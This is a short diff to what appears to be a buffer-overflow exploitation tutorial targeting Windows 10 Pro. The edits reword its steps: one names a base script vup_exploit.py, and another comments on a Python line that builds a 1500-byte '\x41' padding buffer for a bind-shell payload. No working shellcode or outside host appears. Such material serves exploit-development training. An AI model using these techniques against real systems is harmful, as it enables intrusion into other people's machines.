@@ -13,7 +13,7 @@
 - Windows 10 pro
 
 ---
-Open python script <filename>
+Write the base python script for the exploitation proccess and name it as vup_exploit.py
 ```python
 #!/usr/bin/python
 import subprocess
@@ -39,7 +39,7 @@ f.write(shellcode_bind_shellfer)
 f.close()
 ```
 ---
-This Script line will generate a \x41 pattern adding the \x41 desired ammount.
+This Script line will generate a \x41 pattern adding the \x41 desired ammount. You can try with a diferent lenght.
 ```python
 shellcode_bind_shellfer = '\x41' * 1500 # padding
 ```
